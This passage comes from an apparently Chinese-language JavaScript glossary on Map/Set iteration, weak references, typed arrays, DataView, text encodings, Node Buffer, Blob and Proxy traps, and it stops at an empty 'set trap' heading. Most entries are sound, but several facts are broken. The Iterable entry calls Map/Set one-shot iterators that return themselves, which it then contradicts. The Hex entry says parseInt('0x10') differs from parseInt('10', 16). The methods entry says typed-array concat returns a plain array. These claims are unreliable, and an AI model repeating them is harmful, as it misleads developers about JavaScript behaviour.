`Map`/`Set` 的迭代顺序**严格等于插入顺序**，并且覆盖写（`set` 已存在的键）**不会**改变原有位置，而「先 `delete` 再 `set`」会把它挪到末尾。这条性质是实现 LRU 缓存的关键：命中时 `delete + set` 把条目移到队尾，淘汰时取 `map.keys().next().value` 就是最久未使用的键。对比之下，普通 `Object` 的顺序是三段式：整数样式的键升序在前，然后是字符串键按插入顺序，最后是 Symbol 键。也见 [LRU Cache（LRU 缓存）](#lru-cachelru-缓存)。

示例：[`23_collections/02_map_iteration.js`](23_collections/02_map_iteration.js)

### Map Iteration（Map 遍历与数组互转）

`Map` 的 `keys()`/`values()`/`entries()` 都返回迭代器，`entries()` 是默认迭代器（所以 `for (const [k, v] of map)` 直接可用）；转为数组用 `[...map]`（得到 `[k, v]` 数组的数组）、`[...map.keys()]`、`Object.fromEntries(map)`；从数组构造用 `new Map([[k, v], ...])`。关键细节：遍历时**删除**当前或未访问的条目是安全的，但遍历中**新增**的条目可能被访问到（规范规定新增条目「同一轮迭代中不保证被访问」），所以不要在遍历里修改集合结构 —— 需要修改时先 `[...map]` 快照。也见 [Iterable（可迭代协议）](#iterable可迭代协议)。

示例：[`23_collections/02_map_iteration.js`](23_collections/02_map_iteration.js)

### Iterable（可迭代协议）

对象实现 `Symbol.iterator` 方法、返回一个带 `next()` 的迭代器，就能被 `for...of`、展开运算符 `...`、解构、`Array.from`、`Promise.all` 消费。`Map`/`Set`/`Array`/`String`/定型数组/生成器都是可迭代的，因此它们能直接互换使用（`new Map(anotherMap)`、`new Set(array)`、`[...set]`）。关键细节：`Map`/`Set` 是**一次性迭代器**（`map[Symbol.iterator]() === map` 返回自身，迭代器就是集合本身，多个 `for...of` 会各自从头开始，因为每次都调用 `Symbol.iterator` 拿到新迭代器），而生成器对象是**一次性**的（迭代完就 `done`，不能重来）。`Object` **不是**可迭代的，这正是不引入 `Object.entries` 就没法 `for...of` 遍历对象的原因。详细协议见 [`17_iterators_and_generators/01_iterable_protocol.js`](17_iterators_and_generators/01_iterable_protocol.js)。也见 [Map Iteration（Map 遍历与数组互转）](#map-iterationmap-遍历与数组互转)。

示例：[`23_collections/02_map_iteration.js`](23_collections/02_map_iteration.js)

### Weak Reference（弱引用）

一种**不阻止垃圾回收**的引用：只要有强引用链存在，对象就活着；一旦只剩弱引用，对象就可以被回收。JS 里表达弱引用的手段有三种：`WeakMap` 的键、`WeakSet` 的元素、`WeakRef` 的 `deref()`。它们的共同点是**不可观测**——你不能枚举、不能计数、不能知道回收发生的时刻，因为「知道」本身就要求一条强引用。也因此规范允许引擎在对象明明还可达的情况下也不回收（活性只是「可能」而非「必然」）。也见 [WeakRef](#weakref弱引用对象)、[FinalizationRegistry（终结注册表）](#finalizationregistry终结注册表)。

示例：[`23_collections/05_weakmap.js`](23_collections/05_weakmap.js)

### WeakRef（弱引用对象）

ES2021 引入的「把弱引用变成一等值」的 API：`new WeakRef(target)` 创建一个不阻止回收的引用，唯一读取方式是 `ref.deref()` —— 目标还活着就返回它，已被回收就返回 `undefined`。它和 `WeakMap` 的区别是：`WeakMap` 的弱引用**隐式**绑定在键上，`WeakRef` 让弱引用本身可以传来传去、放进数组、当参数。硬性限制：目标必须是对象（原始值抛 `TypeError`）；对象上**没有** `target` 属性，绕不过 `deref()`；`deref()` 返回 `undefined` **不等于**「刚被回收」，也可能只是还没被回收。最重要的纪律是：**绝不能把业务逻辑建立在「回收一定会发生」之上**，`WeakRef` 只适合做「可选加速」（缓存、索引），不能做「必须命中」的数据源。也见 [Weak Reference（弱引用）](#weak-reference弱引用)。

示例：[`23_collections/10_weakref_and_finalization.js`](23_collections/10_weakref_and_finalization.js)

### FinalizationRegistry（终结注册表）

ES2021 引入的「对象被回收之后执行回调」机制：`new FinalizationRegistry(heldValue => {...})` 创建注册表，`registry.register(target, heldValue)` 登记，`registry.unregister(token)` 取消（`token` 是 `register` 的返回值）。回调参数是登记时传入的 `heldValue`，**不能是 `target` 本身**（否则形成强引用，对象永远不回收）；`heldValue` 可以是原始值或另一个独立对象。最关键的一条纪律：**触发时机完全由引擎决定** —— 规范不保证回调会执行、不保证顺序、允许进程结束前一次都不执行，所以它只能作为「尽力而为」的兜底（比如内存泄漏告警），真正的资源释放必须靠显式的 `try...finally` / `close()` / `dispose()`。也见 [WeakRef](#weakref弱引用对象)。

示例：[`23_collections/10_weakref_and_finalization.js`](23_collections/10_weakref_and_finalization.js)

### LRU Cache（LRU 缓存）

「最近最少使用」淘汰策略的缓存，用 `Map` 可以在十几行内实现：`get` 命中时先 `delete` 再 `set` 把键移到末尾（标记为最近使用），`set` 时若 `map.size > capacity` 就删掉 `map.keys().next().value`（队首 = 最久未使用）。之所以能这么简洁，是因为 `Map` 同时提供了 **O(1) 的删除**和**严格插入顺序的迭代**这两件事，普通 `Object` 做不到（整数键会被重排）。常见误解是把它当成「按时间过期」的缓存 —— LRU 只按访问顺序淘汰，与元素年龄无关。其他相关实战（频次统计、邻接表、缓存）见同目录示例。也见 [Insertion Order（插入顺序）](#insertion-order插入顺序)。

示例：[`23_collections/09_map_practical.js`](23_collections/09_map_practical.js)

## 二进制数据（24_typed_arrays）

### ArrayBuffer（字节缓冲区）

一块**定长、原始、不可直接读写**的内存区域，构造时 `new ArrayBuffer(byteLength)` 指定字节数，只能通过 `byteLength`、`slice()`（**复制**）、`isView()` 等少数接口操作。要读写内容必须**在其上建一个「视图」**（定型数组或 `DataView`），这是 JS 二进制模型「缓冲区与视图分离」的核心设计。ES2024 新增了可调整大小的缓冲区：`new ArrayBuffer(n, { maxByteLength })` + `buffer.resize(m)`，以及 `buffer.transfer()` 把内存所有权移走（原缓冲区变成 **detached**，`byteLength` 变 0，再建视图会抛 `TypeError`）。也见 [View vs Buffer（视图与缓冲区的分离）](#view-vs-buffer视图与缓冲区的分离)、[TypedArray（定型数组）](#typedarray定型数组)。

示例：[`24_typed_arrays/01_arraybuffer_basics.js`](24_typed_arrays/01_arraybuffer_basics.js)

### TypedArray（定型数组）

一族共享同一套方法但元素类型不同的构造函数，一共 **11 个**：`Int8Array`、`Uint8Array`、`Uint8ClampedArray`、`Int16Array`、`Uint16Array`、`Int32Array`、`Uint32Array`、`Float32Array`、`Float64Array`、`BigInt64Array`、`BigUint64Array`。它们本身**不拥有内存**，只是 `ArrayBuffer` 上的视图（`ta.buffer` 拿到缓冲区、`ta.byteOffset` 拿到起始偏移、`ta.length` 是元素个数、`ta.BYTES_PER_ELEMENT` 是元素字节宽度）。与普通数组的关键差异：**长度固定**（不能 `push`）、**写入时按类型回绕或舍入**（不是报错）、`sort()` 默认就是**数值排序**（普通数组默认按字符串排）、`map`/`filter`/`slice` 返回**新的定型数组**而不是普通数组、越界读取返回 `undefined` 但越界写入**静默丢弃**（不报错，这是极常见的排查黑洞）。`Uint8Array` 和普通数组还有一个重要区别：`new Uint8Array(arr)` 会**复制**，而 `new Uint8Array(ta.buffer)` 是**共享**。也见 [Overflow Wraparound（溢出回绕）](#overflow-wraparound溢出回绕)、[Endianness（字节序）](#endianness字节序)。

示例：[`24_typed_arrays/03_typed_array_types.js`](24_typed_arrays/03_typed_array_types.js)

### TypedArray Methods（定型数组的方法）

大部分数组方法在定型数组上都可用，但返回类型不同：`map`/`filter`/`slice`/`subarray` 中前三个返回**新的定型数组**（同类型，`filter` 的结果长度可能变短），而 `subarray(a, b)` 返回**共享同一块内存的子视图**（改它会改原数组，`slice` 才是复制）。`set(source, offset)` 把另一个数组/定型数组的数据**复制**进来，是视图间搬数据最快的方式（比逐个赋值快得多）。因为长度固定，`push`/`pop`/`shift`/`splice` 一律不存在；`concat` 也返回普通数组。也见 [View vs Buffer（视图与缓冲区的分离）](#view-vs-buffer视图与缓冲区的分离)。

示例：[`24_typed_arrays/04_typed_array_methods.js`](24_typed_arrays/04_typed_array_methods.js)

### DataView（数据视图）

`ArrayBuffer` 上的另一种视图，与定型数组互补：它不是「同类型元素的数组」，而是一组**显式指定字节偏移和字节序**的读写方法 —— `getInt16(offset, littleEndian)`、`getUint32`、`getFloat64`、`getBigInt64` 及对应的 `setXxx`。它有两个定型数组给不了的能力：**逐次指定字节序**（定型数组只能用平台原生字节序，实际上永远是**小端**，读网络序/大端文件就会错）和**在任意偏移读写**（不需要满足对齐，定型数组的偏移必须是 `BYTES_PER_ELEMENT` 的整数倍）。因此解析二进制文件格式、网络协议包时首选 `DataView`；需要高性能批量数值运算时才换成定型数组。也见 [Endianness（字节序）](#endianness字节序)。

示例：[`24_typed_arrays/02_dataview.js`](24_typed_arrays/02_dataview.js)

### Byte（字节）

8 位（bit）一组的存储单位，是二进制数据处理的基本粒度；1 字节可表示 `0~255` 的无符号数或 `-128~127` 的有符号数。JS 里最常用的字节视图是 `Uint8Array`（同时也是 `Buffer` 的基类），单位换算要注意：`1 KB = 1024 字节`（JS 语境）与十进制的 `1000` 之间的差异是很多「文件大小对不上」的来源。也见 [Bit（位）](#bit位)、[TypedArray（定型数组）](#typedarray定型数组)。

示例：[`24_typed_arrays/01_arraybuffer_basics.js`](24_typed_arrays/01_arraybuffer_basics.js)

### Bit（位）

二进制的最小单位，取值为 0 或 1。JS 用位运算（`&`、`|`、`^`、`<<`、`>>`、`>>>`）操作 32 位整数，因此**位运算是处理「按位标志」（flags / bitmask）的标准手段**：`READ | WRITE` 组合权限、`flags & READ` 检测、`flags | READ` 置位、`flags & ~READ` 清位。两个坑：普通位运算会先把操作数转成**32 位有符号整数**，超过 2^31 的数值会被截断（大数据要用 `BigInt` 的位运算）；`>>>` 是无符号右移（结果非负），`>>` 是带符号右移（负数会补 1）。

示例：[`24_typed_arrays/09_binary_file_parsing.js`](24_typed_arrays/09_binary_file_parsing.js)

### Endianness（字节序）

多字节数值在内存/文件里的字节排列顺序：**大端（big-endian）**把最高有效字节放前面（`0x0102` 存成 `01 02`，网络字节序与许多文件格式用它），**小端（little-endian）**把最低有效字节放前面（`0x0102` 存成 `02 01`，x86/ARM 等主流 CPU 用它）。这是二进制解析里最容易静默出错的地方：读出来的数不对但程序不报错，只是数值荒谬（比如长度字段变成 16777216）。JS 的规则是：**定型数组一律用平台原生字节序**（现实中都是小端），**只有 `DataView` 的 `littleEndian` 参数能逐次指定**；所以凡是格式文档写了「big-endian」的数据，就必须用 `DataView` 或手动倒字节。也见 [DataView（数据视图）](#dataview数据视图)。

示例：[`24_typed_arrays/02_dataview.js`](24_typed_arrays/02_dataview.js)

### View vs Buffer（视图与缓冲区的分离）

JS 二进制模型的核心抽象：`ArrayBuffer` 是**内存**（不关心怎么解释），视图是**解读方式**（不关心内存从哪来）。由此产生三条必须记住的语义：(1) 在同一个 `ArrayBuffer` 上建多个视图，它们**共享内存、互相可见**，写一个另一个立刻变（多视图共享是零拷贝解析的基础）；(2) `new Uint8Array(ta)` 是**复制**，`new Uint8Array(ta.buffer, byteOffset, len)` 才是**共享** —— 只差一个 `.buffer`，行为完全不同；(3) 缓冲区被 `transfer` 或结构化克隆转移后会变成 **detached**，此时 `byteLength === 0`，在它上面建视图会抛 `TypeError`。也见 [ArrayBuffer（字节缓冲区）](#arraybuffer字节缓冲区)、[SharedArrayBuffer（共享内存缓冲区）](#sharedarraybuffersab共享内存缓冲区)。

示例：[`24_typed_arrays/05_multiple_views.js`](24_typed_arrays/05_multiple_views.js)

### SharedArrayBuffer（SAB，共享内存缓冲区）

一种可以在多个「代理（agent）」（主线程与各个 Worker）之间**真正共享**的内存，而不像普通 `ArrayBuffer` 那样只能转移（转移是「给出去」而不是「一起用」）。它是 `Atomics`（原子操作）存在的理由：并发读写同一块内存会产生**数据竞争**，必须靠 `Atomics.load`/`store`/`add`/`wait`/`notify` 或 `Atomics.Mutex` 类模式来同步。使用限制：浏览器里需要跨源隔离头（`Cross-Origin-Opener-Policy: same-origin` + `Cross-Origin-Embedder-Policy: require-corp`）才会把 `SharedArrayBuffer` 暴露给页面，Node 里则直接可用；它**不能**被 transfer/detach，`slice()` 是复制。Node 侧的 worker + 共享内存 + Atomics 示例见 [`26_node_core/17_shared_memory_and_atomics.js`](26_node_core/17_shared_memory_and_atomics.js)。也见 [View vs Buffer（视图与缓冲区的分离）](#view-vs-buffer视图与缓冲区的分离)。

示例：[`24_typed_arrays/05_multiple_views.js`](24_typed_arrays/05_multiple_views.js)

### Overflow Wraparound（溢出回绕）

定型数组写入超出类型范围的值时，**不报错也不夹紧**，而是按 2 的位宽取模回绕：`new Uint8Array(1)[0] = 256` 得到 `0`、`= 257` 得到 `1`、`= -1` 得到 `255`；`Int8Array` 同理（`= 128` 得到 `-128`）。浮点类型例外：`Float32Array` 溢出得到 `±Infinity`，精度不足则舍入。这个行为极易造成静默 bug（比如从颜色分量 `-1` 算出来的 `255` 看起来「还挺合理」），所以**写入前先自己钳制**是必要的防御；而 `Uint8ClampedArray` 正是规范为图像场景提供的「不回绕」版本。也见 [Uint8ClampedArray（夹紧型 8 位无符号数组）](#uint8clampedarray夹紧型-8-位无符号数组)。

示例：[`24_typed_arrays/03_typed_array_types.js`](24_typed_arrays/03_typed_array_types.js)

### Uint8ClampedArray（夹紧型 8 位无符号数组）

`Uint8Array` 的变体，写入时把值**夹紧（clamp）**到 `0~255` 而不是按 256 取模，并且小数部分用**四舍六入五取偶**（round-half-to-even，即「银行家舍入」）：`300 → 255`、`-5 → 0`、`1.5 → 2`、`2.5 → 2`、`128.5 → 128`。它是 `Canvas` 的 `ImageData.data` 的类型，也是 `WebGL`/`WebGPU` 常用的像素缓冲类型 —— 因为像素分量天然要求「越界的亮/暗被截断」而不是「亮到极致反而变黑」。注意它**只影响写入**，读出来永远是 `0~255` 的整数。也见 [Overflow Wraparound（溢出回绕）](#overflow-wraparound溢出回绕)。

示例：[`24_typed_arrays/03_typed_array_types.js`](24_typed_arrays/03_typed_array_types.js)

### TextEncoder / TextDecoder（文本编解码器）

`TextEncoder` 把字符串编码成 `Uint8Array`（**只支持 UTF-8，且不接受编码参数**），`TextDecoder` 把字节解码回字符串（支持 `'utf-8'`、`'utf-16le'`、`'gbk'`、`'iso-8859-1'` 等多种标签，取决于运行时是否带完整 ICU）。三个关键点：(1) 解码非法字节序列时默认**不抛错**，而是插入替换字符 `U+FFFD`（`�`），需要严格模式要传 `{ fatal: true }`；(2) 处理**分块数据**（网络流、大文件）时必须用 `decoder.decode(chunk, { stream: true })`，否则一个多字节字符被切成两半时会解成 `�`；(3) `TextEncoder` 遇到孤立代理项（lone surrogate）会编码成 `U+FFFD`，不是原样保留。也见 [UTF-8](#utf-8utf-8-编码)、[Code Unit（码元）](#code-unit码元)。

示例：[`24_typed_arrays/06_textencoder_decoder.js`](24_typed_arrays/06_textencoder_decoder.js)

### UTF-8（UTF-8 编码）

Unicode 的一种**变长**编码：ASCII 字符 1 字节，拉丁/希腊/西里尔字母 2 字节，中日韩汉字 3 字节，emoji 等补充平面字符 4 字节。它是 Web 与 Node 的默认文本编码（HTTP、JSON、HTML 默认都是 UTF-8），且与 ASCII 向后兼容。与 JS 字符串的差异是最大的坑：**JS 字符串是 UTF-16 码元序列**，所以 `'😀'.length === 2`（两个代理项）而 `new TextEncoder().encode('😀').length === 4`（四个字节），`'中'.length === 1` 而字节长度是 3。处理二进制协议里的「长度字段」时，一定要明确它数的是**字节**还是**字符**。也见 [Code Unit（码元）](#code-unit码元)。

示例：[`24_typed_arrays/06_textencoder_decoder.js`](24_typed_arrays/06_textencoder_decoder.js)

### Code Unit（码元）

**码点**是 Unicode 给每个字符的编号（`U+1F600`），**码元**是编码里用于存储的最小单位：UTF-16 的码元是 16 位，所以基本平面外的字符（码点 > `U+FFFF`）需要**一对代理项（surrogate pair）**表示，这也是 JS 里 `'😀'.length === 2`、`str[0]` 拿到半个字符、`slice()` 可能切碎 emoji 的根本原因。安全遍历字符应使用 `for...of`、展开运算符或 `Array.from(str)`（它们按**码点**迭代），更严谨的字素簇切分则要 `Intl.Segmenter`。字符串侧细节见 [`11_strings/09_unicode_and_codepoints.js`](11_strings/09_unicode_and_codepoints.js)。也见 [UTF-8](#utf-8utf-8-编码)。

示例：[`24_typed_arrays/06_textencoder_decoder.js`](24_typed_arrays/06_textencoder_decoder.js)

### Buffer（Node.js 的字节缓冲区）

Node.js 的二进制主力类型，**是 `Uint8Array` 的子类**，因此定型数组的所有方法都能用，同时还带来一套链式、支持编码参数的独有 API（`toString('base64')`、`writeUInt32BE`、`equals`、`indexOf` 等）。三种创建方式语义完全不同：`Buffer.from(...)` 从字符串/数组/`ArrayBuffer` 创建（**从定型数组拷贝，从 `ArrayBuffer` 共享**），`Buffer.alloc(n)` 分配并**清零**（安全），`Buffer.allocUnsafe(n)` 分配但**不清零**（更快，可能读到进程之前用过的内存，属于安全风险）。`Buffer.from('中文')` 默认按 UTF-8 编码，`Buffer.concat([...])` 拼接多个 Buffer。也见 [Uint8Array 与 Buffer 的关系](#uint8array-与-buffer-的关系)、[Memory Pool（内存池）](#memory-pool内存池)。

示例：[`24_typed_arrays/07_node_buffer.js`](24_typed_arrays/07_node_buffer.js)

### Uint8Array 与 Buffer 的关系

`Buffer` 继承自 `Uint8Array`，所以 `buf instanceof Uint8Array === true`，两者可以互相传递（Web API 如 `fetch`、`Blob`、`crypto.subtle` 都接受 `Buffer`）。差异在**边角**：`Buffer` 有 `toString('hex')`、`writeUInt32BE` 这类编码感知方法，`Uint8Array` 有 `Symbol.iterator` 之外的完整定型数组语义；`Buffer.from(arrayBuffer)` **共享**内存，而 `Buffer.from(uint8Array)` **复制**数据；`new Uint8Array(buf.buffer, buf.byteOffset, buf.byteLength)` 是零拷贝互转的常用手法（注意漏掉 `byteOffset` 会读到池子开头）。写跨环境库时推荐内部统一用 `Uint8Array`，只在 Node 专属路径上用 `Buffer` 的编码方法。也见 [Buffer（Node.js 的字节缓冲区）](#buffernodejs-的字节缓冲区)。

示例：[`24_typed_arrays/07_node_buffer.js`](24_typed_arrays/07_node_buffer.js)

### Memory Pool（内存池）

Node 为了减少系统调用，会在启动时准备一块 **8 KiB** 的内存池（`Buffer.poolSize`，默认 `8192`），凡是 `Buffer.allocUnsafe(n)` 且 `n < poolSize / 2`（即 4 KiB）的请求都从池子里**切一块**出来，而不是单独向系统申请。这带来两个可观测的后果：(1) 小 Buffer 的 `buf.buffer` 是一整块 8 KiB 大内存、`buf.byteOffset` 不为 0 —— 所以 `new Uint8Array(buf.buffer)` 会多出一堆无关字节，正确写法必须带上 `byteOffset` 和 `byteLength`；(2) `allocUnsafe` 拿到的内存可能残留**上一次使用**的数据（包括敏感信息），这就是它「unsafe」的含义，必须立刻 `fill(0)` 或改用 `Buffer.alloc`。也见 [Buffer（Node.js 的字节缓冲区）](#buffernodejs-的字节缓冲区)。

示例：[`24_typed_arrays/07_node_buffer.js`](24_typed_arrays/07_node_buffer.js)

### Base64（Base64 编码）

把任意字节流映射到 64 个可打印字符（`A-Z a-z 0-9 + /`）的编码，**每 3 字节变成 4 个字符**（体积膨胀约 4/3 = 33%），不足 3 字节的末尾用 `=` 补齐。用途是让二进制数据能安全地穿过只支持文本的通道（JSON 字段、HTML 属性、邮件正文、`data:` URL）。两条最容易误解的地方：**Base64 不是加密**，它不提供任何机密性，只是「换个写法」，拿来存密码等同于明文；**它也不是压缩**，体积只会变大。浏览器侧是 `btoa`/`atob`，但它们**只接受 Latin-1** —— 编码含中文的字符串必须先 `new TextEncoder().encode(s)` 拿到字节再转；Node 侧直接 `Buffer.from(s).toString('base64')`。也见 [base64url](#base64urlurl-安全的-base64)、[Hex（十六进制）](#hex十六进制)。

示例：[`24_typed_arrays/08_binary_encoding.js`](24_typed_arrays/08_binary_encoding.js)

### base64url（URL 安全的 Base64）

Base64 的 URL 安全变体：把 `+` 换成 `-`、`/` 换成 `_`，并**去掉末尾的 `=` 填充**，因为 `+`、`/`、`=` 在 URL 和文件名里需要百分号转义，放进 JWT、`data:` URI 或查询参数会出问题。转换本身不改变数据，只是换字符表，两种表示可以无损互转（Node 里 `buf.toString('base64url')` 直接支持）。实战中 JWT 的三段（header/payload/signature）用的就是 base64url，解析时要用支持 base64url 的解码器而不是普通 `atob`（否则 `-`/`_` 会解码失败）。也见 [Base64（Base64 编码）](#base64base64-编码)。

示例：[`24_typed_arrays/08_binary_encoding.js`](24_typed_arrays/08_binary_encoding.js)

### Hex（十六进制）

用两个字符（`0-9a-f`）表示一个字节的文本化写法，体积正好是字节数的 2 倍，因为与二进制**一位对四位**的天然对应关系，是人读字节最方便的格式（调试输出、哈希值、颜色值、dump）。转换方法：`buf.toString('hex')`、`Buffer.from(hexStr, 'hex')`、`Uint8Array.from(hexStr.match(/../g), b => parseInt(b, 16))`。三个坑：`parseInt('0x10')` 与 `parseInt('10', 16)` 结果不同（前者靠前缀自动识别进制，会被 `parseInt('08')` 这类历史行为坑）；十六进制字符串**大小写不敏感**，比较时先 `toLowerCase()`；奇数长度的 hex 字符串无法还原成完整字节。也见 [Base64（Base64 编码）](#base64base64-编码)。

示例：[`24_typed_arrays/08_binary_encoding.js`](24_typed_arrays/08_binary_encoding.js)

### Blob（Binary Large Object，二进制大对象）

Web 平台对「一块**不可变**的二进制数据」的抽象，构造方式 `new Blob(parts, { type })`，`parts` 可以是字符串、`ArrayBuffer`、任何 `ArrayBufferView`（含 `Uint8Array`、`DataView`、`Buffer`）或另一个 `Blob`；`type` 是 MIME 类型。关键特征：读取方法是**异步**的（`await blob.arrayBuffer()`、`await blob.text()`、`await blob.bytes()`），因为大 Blob 可能被浏览器落到磁盘上；`blob.slice(a, b)` 返回**新的 Blob 视图**（不复制底层数据，支持负数下标）；`blob.size` 与 `blob.type` 是元数据。它同时是 `fetch`、`FormData`、`File`、`Response`、`URL.createObjectURL` 的通用「二进制信封」。两个常见误解：`new Blob([u8])` 会把字节**拷贝**进 Blob（之后改 `u8` 不影响 Blob，这其实是好事，避免了竞态）；`blob.text()` 对非 UTF-8 字节不报错，而是插入 `U+FFFD`。Node 18+ 也全局提供了 `Blob`。也见 [File（文件对象）](#file文件对象)、[Object URL（对象 URL）](#object-url对象-url)。

示例：[`24_typed_arrays/11_blob_and_binary_interop.js`](24_typed_arrays/11_blob_and_binary_interop.js)

### File（文件对象）

`File` 是 `Blob` 的**子类**，只多了三个元数据：`name`（文件名）、`lastModified`（毫秒时间戳）、`type`（MIME 类型）。因此**凡是接受 `Blob` 的 API 都能接受 `File`**（`FormData.append`、`fetch` body、`URL.createObjectURL`），反过来不成立。典型来源是 `<input type="file">` 的 `files` 列表和拖拽事件的 `dataTransfer.files`。注意 `File` 的内容只能异步读（继承自 `Blob`），而且用户选择的文件**不会**自动上传到任何地方，必须显式放进 `FormData` 或 `fetch`。也见 [Blob（二进制大对象）](#blobbinary-large-object二进制大对象)。

示例：[`24_typed_arrays/11_blob_and_binary_interop.js`](24_typed_arrays/11_blob_and_binary_interop.js)

### Object URL（对象 URL）

`URL.createObjectURL(blob)` 生成的一个形如 `blob:https://example.com/uuid` 的伪 URL，指向内存中的 Blob，可直接喂给 `<img src>`、`<video src>`、`<a href download>` 等只接受 URL 的地方。它比 `FileReader.readAsDataURL` 快得多，也省内存（不生成 base64 字符串）。**最经典的坑是内存泄漏**：这个 URL 会**一直持有 Blob 的强引用**，直到页面卸载或你显式调用 `URL.revokeObjectURL(url)`，所以每次 `createObjectURL` 都要配对一次 `revoke`（通常在图片 `onload` 后、组件卸载时）。另外它只在**同源**的当前文档内有效，不能跨标签页/跨进程传递。也见 [Blob（二进制大对象）](#blobbinary-large-object二进制大对象)。

示例：[`24_typed_arrays/11_blob_and_binary_interop.js`](24_typed_arrays/11_blob_and_binary_interop.js)

### CompressionStream / DecompressionStream（压缩流）

Web 标准提供的压缩/解压 API，本质是一对 `TransformStream`，把 `uint8array` 流进 `writable`、从 `readable` 读出压缩后的 `uint8array`；支持的格式只有 `'gzip'`、`'deflate'`、`'deflate-raw'` 三种（**不含 brotli**）。用法是管道式的：`stream.pipeThrough(new CompressionStream('gzip'))`。Node 侧另有功能更强的 `node:zlib`（`gzipSync`/`gunzipSync`/`brotliCompressSync`/`zstdCompressSync`、以及流式版本），常用于 HTTP 响应压缩与文件打包。安全提示：解压是**解压炸弹**的入口 —— 几 KB 的输入可以解出几十 GB，服务端必须限制解压后的总大小或设置超时。也见 [Blob（二进制大对象）](#blobbinary-large-object二进制大对象)。

示例：[`24_typed_arrays/10_compression.js`](24_typed_arrays/10_compression.js)

### Binary Format Parsing（二进制格式解析）

从字节流里按约定的布局读出结构化数据的过程，典型步骤是：先读**魔数（magic number）**校验文件类型，再读版本号、字段数、可变长字段的长度等头部信息，然后按偏移逐条解析记录，最后校验尾部。实现要点：**用 `DataView` 明确指定字节序**（格式文档写 big-endian 时必须显式传 `littleEndian = false`），用 `TextDecoder` 解字符串字段，并且**对每一个来自文件的长度/偏移做边界检查** —— 恶意的长度字段会让解析器越界读取或分配巨大内存（DoS）。实战中还要考虑对齐、可变长记录的循环终止条件，以及解析失败时给出「第几字节出错」的诊断信息。也见 [DataView（数据视图）](#dataview数据视图)、[Endianness（字节序）](#endianness字节序)。

示例：[`24_typed_arrays/09_binary_file_parsing.js`](24_typed_arrays/09_binary_file_parsing.js)

## 元编程：Proxy 与 Reflect（25_proxy_and_reflect）

### Metaprogramming（元编程）

编写「操作程序本身」的程序：反射（`Reflect`、`Object.getOwnPropertyDescriptor`）、动态生成代码（`eval`、`new Function`）、拦截并改写语言内置行为（`Proxy`）、装饰器与宏等都属于此列。JS 的元编程有两条腿：**内省（introspection）** —— 读取对象的结构与属性描述符；**拦截（intercession）** —— 改写属性访问、函数调用等基本操作的默认行为。`Proxy` + `Reflect` 是 ES2015 为「拦截」提供的官方机制：`Proxy` 定义拦截逻辑，`Reflect` 提供被拦截操作原本的默认实现，两者成对出现才能写出正确的代理。也见 [Proxy](#proxy代理对象)、[Reflect](#reflect反射对象)。

示例：[`25_proxy_and_reflect/01_proxy_basics.js`](25_proxy_and_reflect/01_proxy_basics.js)

### Proxy（代理对象）

`new Proxy(target, handler)` 创建的**包装对象**，它把对自身的操作转发到 `handler` 里对应的陷阱函数，未定义陷阱的操作则直接落到 `target` 上（这叫「默认透传」）。关键点：`proxy` **不是** `target` 的克隆，它自己几乎没有状态（内部只有 `[[ProxyTarget]]` 与 `[[ProxyHandler]]` 两个槽），所有读写最终都作用在 `target` 上，所以 `proxy !== target` 但 `proxy.x = 1` 之后 `target.x === 1`。代理可以包裹对象、数组、函数（此时 `typeof proxy === 'function'`、`proxy()` 会走 `apply` 陷阱）、甚至另一个代理。典型用途：数据校验、日志/埋点、响应式系统（Vue 3）、访问控制、虚拟对象（负索引、默认值）、按需加载。也见 [Trap（陷阱）](#trap陷阱)、[Invariant（不变量）](#invariant不变量)、[Proxy 的局限](#proxy-limitationsproxy-的局限)。

示例：[`25_proxy_and_reflect/01_proxy_basics.js`](25_proxy_and_reflect/01_proxy_basics.js)

### Handler（处理器）

传给 `Proxy` 构造函数的第二个参数，是一个普通对象（也可以是 `Proxy` 或 `Object.create(null)`），其属性名对应各种陷阱、属性值是陷阱函数。它**不需要穷举**所有陷阱：没写的操作会自动走 `target` 的默认行为（等价于 `Reflect.xxx(target, ...)`）。规范要求它是对象（传 `null` 会抛 `TypeError`，想表达「全默认」应传 `{}`），并且陷阱函数是从 handler 上**逐次读取**的 —— 因此 handler 自己也可以是代理，不过这会让性能成倍下降。也见 [Trap（陷阱）](#trap陷阱)。

示例：[`25_proxy_and_reflect/01_proxy_basics.js`](25_proxy_and_reflect/01_proxy_basics.js)

### Trap（陷阱）

`handler` 上拦截某个内部方法的函数，名字与 `Reflect` 的静态方法**一一对应**，一共 13 个：`get`、`set`、`has`、`deleteProperty`、`ownKeys`、`getOwnPropertyDescriptor`、`defineProperty`、`getPrototypeOf`、`setPrototypeOf`、`isExtensible`、`preventExtensions`、`apply`、`construct`。每个陷阱都接收 `target` 作为第一个参数（`apply`/`construct` 略有不同），并通常把剩余参数原样转交给同名的 `Reflect` 方法以保留默认语义。陷阱里抛出的异常会直接冒泡给调用方，因此在 `set` 里做类型校验可以把「静默写入错误值」变成「立刻报错」。也见 [Reflect（反射对象）](#reflect反射对象)、[get trap](#get-trapget-陷阱)。

示例：[`25_proxy_and_reflect/02_get_set_traps.js`](25_proxy_and_reflect/02_get_set_traps.js)

### get trap（get 陷阱）

拦截**读取属性**（`proxy.x`、`proxy['x']`、解构、`in` 之外的几乎所有读取路径，包括方法调用时先取属性这一步），签名是 `get(target, key, receiver)`。三个要点：(1) `key` 可能是 `Symbol`（比如 `Symbol.toPrimitive`、`Symbol.iterator`、`Symbol.toStringTag`），所以陷阱里不要假设它是字符串；(2) `receiver` 是**最初接收访问的对象**，通常就是代理本身，把它传给 `Reflect.get(target, key, receiver)` 才能让继承来的 getter 里的 `this` 指向代理（响应式系统靠这一点实现深层追踪）；(3) 如果直接返回 `Reflect.get(target, key)` 而不传 `receiver`，getter 里的 `this` 会变回 `target`，嵌套属性就不会被追踪。也见 [Reflect（反射对象）](#reflect反射对象)、[Reactive（响应式）](#reactive响应式原理)。

示例：[`25_proxy_and_reflect/02_get_set_traps.js`](25_proxy_and_reflect/02_get_set_traps.js)

### set trap（set 陷阱）

